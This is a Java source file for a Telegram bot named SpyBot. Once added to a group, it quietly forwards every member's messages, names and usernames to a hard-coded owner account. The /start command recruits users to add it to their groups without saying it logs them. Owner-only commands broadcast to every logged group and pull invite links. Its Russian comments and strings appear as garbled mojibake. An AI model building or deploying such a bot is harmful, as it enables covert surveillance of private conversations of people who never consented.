package org.example;

import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.api.methods.groupadministration.ExportChatInviteLink;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.objects.Chat;
import org.telegram.telegrambots.meta.api.objects.Message;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.api.objects.User;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.InlineKeyboardMarkup;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.InlineKeyboardButton;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
import org.telegram.telegrambots.meta.exceptions.TelegramApiRequestException;

import java.io.*;
import java.util.*;

public class SpyBot extends TelegramLongPollingBot {

    private final long ownerId = 1032570871L; // –ó–∞–º–µ–Ω–∏ –Ω–∞ —Å–≤–æ–π Telegram user ID
    private final File groupsFile = new File("groups.txt");

    // –ì–¥–µ-–Ω–∏–±—É–¥—å –≤ –∫–ª–∞—Å—Å–µ –±–æ—Ç–∞ (–≥–ª–æ–±–∞–ª—å–Ω–æ)
    private final Set<Long> invitedUsers = new HashSet<>();

    @Override
    public String getBotUsername() {
        return "@SpyMyMessageBot"; // –ó–∞–º–µ–Ω–∏—Ç—å –Ω–∞ –∏–º—è –±–æ—Ç–∞
    }

    @Override
    public String getBotToken() {
        try {
            Properties props = new Properties();
            props.load(new FileInputStream("config.properties"));
            return props.getProperty("bot.token");
        } catch (IOException e) {
            e.printStackTrace();
            return null; // –∏–ª–∏ –∫–∏–¥–∞–π –æ—à–∏–±–∫—É, –µ—Å–ª–∏ —Ö–æ—á–µ—à—å
        }
    }


    @Override
    public void onUpdateReceived(Update update) {
        if (update.hasMessage()) {
            Message msg = update.getMessage();
            Chat chat = msg.getChat();
            long userId = msg.getFrom().getId();

            if (chat.isGroupChat() || chat.isSuperGroupChat()) {
                saveGroupId(chat.getId());

                User sender = msg.getFrom();

                String senderName = sender.getFirstName();
                if (sender.getLastName() != null) {
                    senderName += " " + sender.getLastName();
                }

                String username = sender.getUserName() != null ? "@" + sender.getUserName() : "[–Ω–µ—Ç username]";

                String messageText;
                if (msg.hasText()) {
                    messageText = msg.getText();
                } else if (msg.hasSticker()) {
                    messageText = "[–°—Ç–∏–∫–µ—Ä: " + msg.getSticker().getEmoji() + "]";
                } else if (msg.hasPhoto()) {
                    messageText = "[–§–æ—Ç–æ]";
                } else if (msg.hasDocument()) {
                    messageText = "[–î–æ–∫—É–º–µ–Ω—Ç: " + msg.getDocument().getFileName() + "]";
                } else if (msg.hasVideo()) {
                    messageText = "[–í–∏–¥–µ–æ]";
                } else {
                    messageText = "[–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π —Ç–∏–ø —Å–æ–æ–±—â–µ–Ω–∏—è]";
                }

                String text = "üì• –ù–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –∏–∑ –≥—Ä—É–ø–ø—ã:\n" +
                        "üë• –ù–∞–∑–≤–∞–Ω–∏–µ: " + chat.getTitle() + "\n" +
                        "üÜî Group ID: " + chat.getId() + "\n" +
                        "üôé‚Äç‚ôÇÔ∏è –û—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—å: " + senderName + "\n" +
                        "üîó Username: " + username + "\n" +
                        "üí¨ –°–æ–æ–±—â–µ–Ω–∏–µ: " + messageText;

                sendMessage(ownerId, text);
            }


            // –ö–æ–º–∞–Ω–¥–∞ –æ—Ç –≤–ª–∞–¥–µ–ª—å—Ü–∞ –≤ –õ–°: /alert —Å–æ–æ–±—â–µ–Ω–∏–µ
            if (chat.isUserChat() && msg.getFrom().getId() == ownerId) {
                String text = msg.getText();

                if (text.startsWith("/alert ")) {
                    String args = text.substring(7).trim();

                    // –ï—Å–ª–∏ –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å "-", –≤–æ–∑–º–æ–∂–Ω–æ —ç—Ç–æ groupId
                    if (args.startsWith("-") || args.matches("-?\\d+ .*")) {
                        // –ü—ã—Ç–∞–µ–º—Å—è –≤—ã–¥–µ–ª–∏—Ç—å ID –∏ —Å–æ–æ–±—â–µ–Ω–∏–µ
                        int firstSpaceIndex = args.indexOf(' ');
                        if (firstSpaceIndex > 0) {
                            try {
                                String groupIdStr = args.substring(0, firstSpaceIndex);
                                long groupId = Long.parseLong(groupIdStr);
                                String messageToGroup = args.substring(firstSpaceIndex + 1);
                                sendMessage(groupId, messageToGroup);
                                sendMessage(ownerId, "‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ –≥—Ä—É–ø–ø—É " + groupId);
                            } catch (NumberFormatException e) {
                                sendMessage(ownerId, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç Group ID.");
                            }
                        } else {
                            sendMessage(ownerId, "‚ùå –£–∫–∞–∂–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ—Å–ª–µ Group ID.");
                        }
                    } else {
                        // –°—Ç–∞—Ä—ã–π —Å–ø–æ—Å–æ–± ‚Äî –≤—Å–µ–º –≥—Ä—É–ø–ø–∞–º
                        sendToAllGroups(args);
                        sendMessage(ownerId, "üì® –°–æ–æ–±—â–µ–Ω–∏–µ —Ä–∞–∑–æ—Å–ª–∞–Ω–æ –ø–æ –≥—Ä—É–ø–ø–∞–º!");
                    }
                }













                if (text.startsWith("/forcejoin") && userId == ownerId) { // –¢–æ–ª—å–∫–æ –¥–ª—è —Ç–µ–±—è
                    String[] parts = text.split(" ");
                    if (parts.length < 2) {
                        sendMessage(userId, "‚ùå –£–∫–∞–∂–∏ Group ID: /forcejoin <groupID>");
                        return;
                    }

                    try {
                        long groupId = Long.parseLong(parts[1]);

                        try {
                            // 1. –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å —Å—Å—ã–ª–∫—É-–ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–µ (–µ—Å–ª–∏ –±–æ—Ç –∞–¥–º–∏–Ω)
                            ExportChatInviteLink request = new ExportChatInviteLink();
                            request.setChatId(String.valueOf(groupId));
                            String inviteLink = execute(request);

                            sendMessage(userId, "üîó –ù–∞–∂–º–∏, —á—Ç–æ–±—ã –ø—Ä–∏—Å–æ–µ–¥–∏–Ω–∏—Ç—å—Å—è:\n" + inviteLink);

                        } catch (TelegramApiRequestException e) {
                            // –ï—Å–ª–∏ –æ—à–∏–±–∫–∞ Telegram API (–Ω–∞–ø—Ä–∏–º–µ—Ä, –±–æ—Ç –Ω–µ –∞–¥–º–∏–Ω)
                            sendMessage(userId, "‚ùå error with joining group");
                        } catch (TelegramApiException e) {
                            // –ï—Å–ª–∏ —Å–∏—Å—Ç–µ–º–Ω–∞—è –æ—à–∏–±–∫–∞ Java/Telegram API
                            sendMessage(userId, "‚ùå error with joining group (system error)");
                            e.printStackTrace();
                        }

                    } catch (NumberFormatException e) {
                        sendMessage(userId, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç Group ID.");
                    }
                }





















                if (text.equals("/start")) {
                    if (!invitedUsers.contains(userId)) {
                        invitedUsers.add(userId); // –ó–∞–ø–æ–º–∏–Ω–∞–µ–º, —á—Ç–æ —É–∂–µ –æ—Ç–ø—Ä–∞–≤–ª—è–ª–∏

                        String botUsername = "SpyMyMessageBot"; // –±–µ–∑ @

                        SendMessage msgFromBot = new SendMessage();
                        msgFromBot.setChatId(String.valueOf(userId));
                        msgFromBot.setText("‚ûï –ù–∞–∂–º–∏ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ, —á—Ç–æ–±—ã –¥–æ–±–∞–≤–∏—Ç—å –º–µ–Ω—è –≤ —Å–≤–æ—é –≥—Ä—É–ø–ø—É:");

                        InlineKeyboardButton addButton = new InlineKeyboardButton();
                        addButton.setText("‚ûï –î–æ–±–∞–≤–∏—Ç—å –≤ –≥—Ä—É–ø–ø—É");
                        addButton.setUrl("https://t.me/" + botUsername + "?startgroup=true");

                        List<List<InlineKeyboardButton>> keyboard = new ArrayList<>();
                        keyboard.add(Collections.singletonList(addButton));

                        InlineKeyboardMarkup markup = new InlineKeyboardMarkup();
                        markup.setKeyboard(keyboard);
                        msgFromBot.setReplyMarkup(markup);

                        try {
                            execute(msgFromBot);
                        } catch (TelegramApiException e) {
                            e.printStackTrace();
                        }
                    } else {
                        // –ï—Å–ª–∏ —É–∂–µ –æ—Ç–ø—Ä–∞–≤–ª—è–ª–∏ ‚Äî –º–æ–∂–Ω–æ –Ω–∏—á–µ–≥–æ –Ω–µ –¥–µ–ª–∞—Ç—å –∏–ª–∏ –Ω–∞–ø–∏—Å–∞—Ç—å: "–í—ã —É–∂–µ –ø–æ–ª—É—á–∏–ª–∏ —Å—Å—ã–ª–∫—É"
                        SendMessage alreadySent = new SendMessage();
                        alreadySent.setChatId(String.valueOf(userId));
                        alreadySent.setText("‚úÖ –í—ã —É–∂–µ –ø–æ–ª—É—á–∏–ª–∏ –∫–Ω–æ–ø–∫—É –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –±–æ—Ç–∞ –≤ –≥—Ä—É–ø–ø—É.");
                        try {
                            execute(alreadySent);
                        } catch (TelegramApiException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }


        }
    }

    private void saveGroupId(Long groupId) {
        try {
            Set<String> existingIds = new HashSet<>();
            if (groupsFile.exists()) {
                BufferedReader reader = new BufferedReader(new FileReader(groupsFile));
                String line;
                while ((line = reader.readLine()) != null) {
                    existingIds.add(line.trim());
                }
                reader.close();
            }

            if (!existingIds.contains(groupId.toString())) {
                FileWriter writer = new FileWriter(groupsFile, true);
                writer.write(groupId + "\n");
                writer.close();
                System.out.println("üíæ –ì—Ä—É–ø–ø–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∞: " + groupId);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void sendToAllGroups(String message) {
        try {
            if (!groupsFile.exists()) return;

            BufferedReader reader = new BufferedReader(new FileReader(groupsFile));
            String line;
            while ((line = reader.readLine()) != null) {
                try {
                    long chatId = Long.parseLong(line.trim());
                    sendMessage(chatId, message);
                } catch (NumberFormatException e) {
                    System.out.println("‚ùå –ù–µ–≤–∞–ª–∏–¥–Ω—ã–π ID: " + line);
                }
            }
            reader.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void sendMessage(long chatId, String text) {
        SendMessage msg = new SendMessage();
        msg.setChatId(chatId);
        msg.setText(text);
        try {
            execute(msg);
        } catch (TelegramApiException e) {
            System.out.println("‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ " + chatId + ": " + e.getMessage());
        }
    }
}
